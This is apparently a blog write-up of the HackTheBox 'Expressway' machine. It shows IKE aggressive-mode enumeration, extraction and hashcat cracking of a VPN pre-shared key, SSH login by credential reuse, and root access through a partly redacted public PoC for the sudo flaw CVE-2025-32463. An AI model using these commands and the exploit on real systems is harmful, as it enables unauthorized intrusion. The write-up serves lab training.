---
title: "HackTheBox: Expressway" 
date: 2025-11-29 23:00:00 +0000
categories: [HackTheBox, FullPwn]
tags: [IKE, ISAKMP, IPsec, VPN, PSK, Hashcat, UDP, 3DES, SHA1, Privilege-Escalation, Sudo, CVE-2025-32463, Crypto, SSH]
image:
    path: /images/hackthebox/fullpwn/expressway/room_image.png
excerpt: "Explore how I tackled the 'Expressway' challenge on HackTheBox!"
description: "Explore how I tackled the 'Expressway' challenge on HackTheBox!"
---

## Details
![Challenge Card](/images/hackthebox/fullpwn/expressway/info_card.png){: width="500" height="200" }

[**Challenge Link**](https://app.hackthebox.com/machines/Expressway)

---

## Initial Enumeration

I begin by confirming the target is online by sending basic ICMP requests:

```bash
$ ping -c 4 10.10.11.87
PING 10.10.11.87 (10.10.11.87) 56(84) bytes of data.
64 bytes from 10.10.11.87: icmp_seq=1 ttl=63 time=21.3 ms
64 bytes from 10.10.11.87: icmp_seq=2 ttl=63 time=21.8 ms
64 bytes from 10.10.11.87: icmp_seq=3 ttl=63 time=24.5 ms
64 bytes from 10.10.11.87: icmp_seq=4 ttl=63 time=21.4 ms

--- 10.10.11.87 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3009ms
rtt min/avg/max/mdev = 21.291/22.238/24.451/1.289 ms
```

The machine responds, so I start a normal TCP enumeration with Nmap:

```bash
$ nmap -sC -sV 10.10.11.87
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-30 00:35 GMT
Nmap scan report for 10.10.11.87
Host is up (0.028s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The scan revealed that the victim machine has only 1 `TCP` port open:

- `22/tcp - ssh`

So, I decided to scan `UDP` ports as well because there might be open ports that could be useful since there is not much `TCP` ports open:

```bash
$ sudo nmap -sU -v 10.10.11.87 --max-retries 0
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-30 00:40 GMT
Initiating Ping Scan at 00:40
Scanning 10.10.11.87 [4 ports]
Completed Ping Scan at 00:40, 0.12s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 00:40
Completed Parallel DNS resolution of 1 host. at 00:40, 0.02s elapsed
Initiating UDP Scan at 00:40
Scanning 10.10.11.87 [1000 ports]
Warning: 10.10.11.87 giving up on port because retransmission cap hit (0).
Discovered open port 500/udp on 10.10.11.87
Completed UDP Scan at 00:40, 2.48s elapsed (1000 total ports)
Nmap scan report for 10.10.11.87
Host is up (0.026s latency).
Not shown: 991 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
500/udp   open   isakmp
829/udp   closed pkix-3-ca-ra
1072/udp  closed cardax
9370/udp  closed unknown
18669/udp closed unknown
19995/udp closed unknown
31195/udp closed unknown
40116/udp closed unknown
61319/udp closed unknown
```

It can be observed that 1 `UDP` port is open:

- `500/udp - isakmp`


This is important.  
UDP/500 is associated with **ISAKMP**, part of the **IKE (Internet Key Exchange)** protocol used in IPsec VPNs.

---

## IKE / ISAKMP Enumeration

### Main Mode Scan

I used `ike-scan` with main mode to enumerate the service and what kind of cryptographic parameters it uses:

```bash
$ sudo ike-scan -M 10.10.11.87

10.10.11.87     Main Mode Handshake returned
        HDR=(CKY-R=4f3e228ed46e6708)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.5: 1 hosts scanned in 0.037 seconds (26.78 hosts/sec).  1 returned handshake; 0 returned notify
```

Main mode enumeration revealed:

- `Encryption: 3DES`  
- `Hash: SHA1`
- `Authentication: PSK (Pre-Shared Key)`

> These settings are weak by modern standards.  
> `3DES` and `SHA1` are both outdated and no longer considered secure, and using a `PSK` can be vulnerable to certain attacks—especially if the key is short or poorly chosen.  
{: .prompt-danger } 


### Aggressive Mode Enumeration

Next, I try Aggressive Mode, which can leak identity information:

```bash
$ sudo ike-scan --aggressive -M 10.10.11.87

10.10.11.87     Aggressive Mode Handshake returned
        HDR=(CKY-R=fdfa116c25780c0f)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

Ending ike-scan 1.9.5: 1 hosts scanned in 0.035 seconds (28.62 hosts/sec).  1 returned handshake; 0 returned notify
```

This reveals a user ID:

- `ike@expressway.htb`

> This ID likely corresponds to a local user on the target system, which we can later try during authentication.  
{: .prompt-tip }

---

## Hash Extraction and Offline Cracking

### Hash Extraction

I extracted the PSK hash using `ike-scan` in Aggressive Mode, allowing me to perform offline cracking:

```bash
$ ike-scan -M -A 10.10.11.87 --pskcrack=hash.txt

10.10.11.87     Aggressive Mode Handshake returned
        HDR=(CKY-R=ffa74d757939f6a7)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

Ending ike-scan 1.9.5: 1 hosts scanned in 0.033 seconds (30.19 hosts/sec).  1 returned handshake; 0 returned notify
```
The PSK Hash is successfully saved in `hash.txt`

### Offline Cracking PSK Hash

I utilized `Hashcat` to crack the PSK Hash "`hash.txt`":

```bash
$ hashcat -m 5400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-penryn-Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz, 2913/5890 MB (1024 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

================================================================
                                    [REDACTED]
================================================================

24[Redacted]7b:freakingrockstarontheroad
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5400 (IKE-PSK SHA1)
Hash.Target......: 24fdccb8851a85c5e26b680e217a2ddf66c30d512baab81cd7e...edf67b
Time.Started.....: Sun Nov 30 01:26:23 2025 (10 secs)
Time.Estimated...: Sun Nov 30 01:26:33 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   818.7 kH/s (1.35ms) @ Accel:512 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8045568/14344385 (56.09%)
Rejected.........: 0/8045568 (0.00%)
Restore.Point....: 8042496/14344385 (56.07%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: freddylokito -> freacadadisc
Hardware.Mon.#1..: Util: 25%

Started: Sun Nov 30 01:26:20 2025
Stopped: Sun Nov 30 01:26:35 2025
```

After running a dictionary attack, Hashcat finds the plaintext `PSK`

- `freakingrockstarontheroad`

> - `-m 5400`: Hash mode for IKE-PSK (Aggressive Mode, SHA1)  
> - `-a 0`: Straight dictionary attack  
> - `rockyou.txt`: Wordlist used for cracking  
{: .prompt-info }

Now that we have the username `ike` and the PSK `freakingrockstarontheroad`, and knowing that `22/tcp - ssh` is open, I attempted **credential reuse** to see if these credentials would work for the user `ike` over SSH.

---

## Initial Foothold - SSH Access

I attempt to authenticate over SSH using:

- `Username`: ike  
- `Password`: freakingrockstarontheroad

```bash
$ ssh ike@10.10.11.87                      
ike@10.10.11.87's password: 
Last login: Sat Nov 29 22:35:52 GMT 2025 from 10.10.14.155 on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Nov 30 01:48:22 2025 from 10.10.15.211
ike@expressway:~$ whoami
ike
```

Bingo! the credential reuse is worked and I gained user-level access on the system (`ike`).

Here I got the user flag:

```bash
ike@expressway:~$ cat user.txt
74c2[-----REDACTED-----]fa8d
```

---

## Privilege Escalation

I begin privilege escalation by checking sudo permissions:

```bash
$ sudo -l
Password: 
Sorry, user ike may not run sudo on expressway.
```

Instead of the typical sudo output, I receive:

`Sorry, user ike may not run sudo on expressway.`

This message appears custom, so I check where the sudo binary is located:

```bash
$ which sudo
/usr/local/bin/sudo
```

It returns:

- `/usr/local/bin/sudo`

This is **not** the normal system path (`/usr/bin/sudo`), suggesting that sudo was manually installed.

I check its version:

```bash
$ sudo --version
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```

It shows:

- `Sudo version 1.9.17`

I then researched the installed sudo version for known vulnerabilities and found **CVE-2025-32463**, which affects sudo versions up to and including 1.9.17 and can be exploited to gain root access on the system.

> - `CVE-2025-32463` is a local privilege escalation vulnerability affecting the Sudo binary. It allows a local user to gain root privileges under certain conditions by leveraging improper input handling. The vulnerability was discovered by Rich Mirch.
{: .prompt-info }

### Exploiting CVE-2025-32463

I found a public proof-of-concept ([PoC](https://github.com/kh4sh3i/CVE-2025-32463)) exploit online containing a small shell script

Since the script was short, I manually copied it and pasted it onto the victim machine, saving it as `exploit.sh`:

```bash
ike@expressway:~$ ls
exploit.sh  user.txt
ike@expressway:~$ cat exploit.sh
#!/bin/bash
# sudo-chwoot.sh
# CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch
#                  @ Stratascale Cyber Research Unit (CRU)
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd ${STAGE?} || exit 1
                        |
                        |
                        |
                     REDACTED
                        |
                        |
                        |
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

echo "woot!"
sudo -R woot woot
rm -rf ${STAGE?}
```

### User Root

I made the script executable and ran it:

```bash
$ chmod +x exploit.sh
$ ./exploit.sh
woot!
root@expressway:/# id
uid=0(root) gid=0(root) groups=0(root),13(proxy),1001(ike)
```

We have successfully owned the system :))

